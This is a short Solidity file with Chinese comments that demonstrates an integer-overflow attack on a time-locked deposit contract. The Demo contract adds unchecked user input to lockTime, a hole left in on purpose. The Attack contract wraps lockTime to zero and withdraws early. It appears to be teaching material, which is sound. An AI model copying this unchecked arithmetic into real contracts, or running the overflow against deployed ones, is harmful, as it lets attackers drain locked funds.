// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

contract Demo {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    // 存
    function deposit() public payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    // 取
    function withdraw() external {
        require(balances[msg.sender] > 0, "Insufficient balance");
        require(lockTime[msg.sender] < block.timestamp, "lock-in period");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Send failed");
    }

    // 续时间
    function increaseLockTime(uint256 time) public {
        lockTime[msg.sender] += time;
    }
}

contract Attack {
    Demo public demo;

    constructor(address _demoAddress) public {
        demo = Demo(_demoAddress);
    }

    fallback() external payable {}

    function attack() external payable {
        demo.deposit{value: msg.value}();
        // uint(-1) => uint(2**256-1)
        // currentTime = demo.balances(msg.sender)
        // 增加的时间 x  = 2**256 - currentTime
        // 增加的时间 x  = - currentTime
        demo.increaseLockTime(uint256(-demo.lockTime(address(this))));
        demo.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}